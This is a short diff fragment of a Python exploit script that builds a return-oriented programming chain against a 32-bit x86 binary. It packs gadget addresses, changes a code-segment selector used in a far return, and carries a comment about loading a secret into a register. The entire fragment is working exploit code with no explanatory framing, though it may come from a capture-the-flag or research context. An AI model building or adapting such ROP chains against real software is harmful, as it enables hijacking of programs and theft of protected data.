@@ -72,7 +72,7 @@ p += pack('<I', 0x080485f4) # pop ebp ; ret
 p += pack('<I', 0x00000000) # @ 0
 p += pack('<I', 0x0807c05f) # add ebp, eax ; retf
 p += pack('<I', 0x0812c918) # add esp, ebp ; add cl, byte ptr [esi] ; adc al, 0x43 ; ret
-p += pack('<I', 0x00000073) # cs
+p += pack('<I', 0x00000023) # cs
 # mov ecx, *secret
 p += pack('<I', 0x0808522a) # pop edx ; ret
 p += pack('<I', 0x08139050) # @ .data = for nothing :)
